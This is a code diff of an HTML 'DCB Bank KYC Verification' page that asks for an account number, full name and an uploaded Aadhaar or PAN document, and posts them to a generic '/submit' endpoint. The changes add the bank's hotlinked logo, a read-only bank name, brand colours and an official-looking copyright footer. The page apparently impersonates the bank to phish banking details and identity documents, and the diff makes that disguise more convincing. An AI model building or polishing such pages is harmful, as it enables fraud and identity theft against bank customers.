@@ -1,42 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>DCB KYC verification submission</title>
+  <meta charset="UTF-8">
+  <title>DCB Bank KYC Verification</title>
   <style>
-    body { font-family: Arial; background: #f0f0f0; padding: 20px; }
-    .container {
-      max-width: 400px; margin: auto; background: #fff;
-      padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      margin: 0;
+      padding: 0;
     }
-    h2 { text-align: center; }
-    label { margin-top: 10px; display: block; }
-    input[type="text"], input[type="number"], input[type="file"] {
-      width: 100%; padding: 8px; margin-top: 5px;
+    .container {
+      max-width: 500px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 180px;
+    }
+    h2 {
+      text-align: center;
+      color: #003d6a;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
     button {
-      margin-top: 15px; padding: 10px; width: 100%;
-      background: #1a73e8; color: #fff; border: none; border-radius: 4px;
+      margin-top: 25px;
+      width: 100%;
+      background-color: #003d6a;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00548c;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #777;
     }
   </style>
 </head>
 <body>
   <div class="container">
+    <img src="https://www.dcbbank.com/p/images/logo.png" alt="DCB Bank" class="logo">
     <h2>DCB Bank KYC Verification</h2>
     <form action="/submit" method="POST" enctype="multipart/form-data">
-      <label>Bank Name</label>
-      <input type="text" name="bankname" required>
+      <label for="bankname">Bank Name</label>
+      <input type="text" id="bankname" name="bankname" value="DCB Bank" readonly>
 
-      <label>Account Number</label>
-      <input type="number" name="accno" required>
+      <label for="accno">Account Number</label>
+      <input type="text" id="accno" name="accno" required>
 
-      <label>Full Name</label>
-      <input type="text" name="fullname" required>
+      <label for="fullname">Full Name</label>
+      <input type="text" id="fullname" name="fullname" required>
 
-      <label>Upload Aadhaar or PAN (PDF/Image)</label>
-      <input type="file" name="document" accept=".jpg,.jpeg,.png,.pdf" required>
+      <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
+      <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
 
-      <button type="submit">Submit</button>
+      <button type="submit">Verify Account</button>
     </form>
+    <div class="footer">
+      © 2025 DCB Bank Ltd. | For official verification purposes only.
+    </div>
   </div>
 </body>
 </html>
